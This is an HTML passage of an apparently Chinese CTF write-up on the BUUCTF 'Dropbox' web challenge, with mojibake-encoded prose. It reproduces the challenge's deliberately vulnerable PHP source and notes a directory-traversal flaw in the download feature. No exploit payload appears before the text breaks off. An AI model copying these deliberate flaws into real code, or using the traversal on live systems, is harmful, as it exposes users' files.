	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250315133249902_hu3376677698306453454.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250315133249902_hu14700647638861804952.png 1024w"
	loading="lazy"
	
		alt="image-20250315133249902"
	
	
		class="gallery-image" 
		data-flex-grow="740"
		data-flex-basis="1777px"
	
></p>
<h2 id="ciscn2019-ååŒ—èµ›åŒº-day1-web1dropbox">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox
</h2><p>æ³¨å†Œç™»å…¥åæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä¸èƒ½ä¸Šä¼ php</p>
<p>ä¸Šä¼ å…¶ä»–æ–‡ä»¶æœ‰ä¸‹è½½åŠŸèƒ½å­˜åœ¨ç›®å½•ç©¿è¶Š</p>
<p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">include &#34;class.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">$a = new FileList($_SESSION[&#39;sandbox&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="err">$a-&gt;Name();
</span></span></span><span class="line"><span class="cl"><span class="err">$a-&gt;Size();
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>class.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbaddr</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbuser</span> <span class="o">=</span> <span class="s2">&#34;root&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">&#34;root&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;dropbox&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$dbaddr</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">user_exist</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">store_result</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$count</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">add_user</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_exist</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$password</span> <span class="o">.</span> <span class="s2">&#34;SiAchGHmFx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;ss&#34;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">verify_user</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_exist</span><span class="p">(</span><span class="nv">$username</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$password</span> <span class="o">.</span> <span class="s2">&#34;SiAchGHmFx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT `password` FROM `users` WHERE `username` = ?;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_result</span><span class="p">(</span><span class="nv">$expect</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$expect</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$expect</span> <span class="o">===</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$results</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$funcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filenames</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">=</span> <span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="nv">$filenames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$filenames</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">=</span> <span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">,</span> <span class="nv">$filenames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$filenames</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filenames</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span><span class="p">,</span> <span class="nv">$func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()][</span><span class="nv">$func</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">=</span> <span class="s1">&#39;&lt;div id=&#34;container&#34; class=&#34;container&#34;&gt;&lt;div class=&#34;table-responsive&#34;&gt;&lt;table id=&#34;table&#34; class=&#34;table table-bordered table-hover sm-font&#34;&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;thead&gt;&lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;th scope=&#34;col&#34; class=&#34;text-center&#34;&gt;Opt&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/thead&gt;&lt;tbody&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="k">as</span> <span class="nv">$filename</span> <span class="o">=&gt;</span> <span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$func</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;td class=&#34;text-center&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;td class=&#34;text-center&#34; filename=&#34;&#39;</span> <span class="o">.</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&#34;&gt;&lt;a href=&#34;#&#34; class=&#34;download&#34;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&#34;#&#34; class=&#34;delete&#34;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$table</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">name</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">size</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$units</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39; B&#39;</span><span class="p">,</span> <span class="s1">&#39; KB&#39;</span><span class="p">,</span> <span class="s1">&#39; MB&#39;</span><span class="p">,</span> <span class="s1">&#39; GB&#39;</span><span class="p">,</span> <span class="s1">&#39; TB&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1024</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="nv">$size</span> <span class="o">/=</span> <span class="mi">1024</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="nv">$units</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">detele</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>download.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
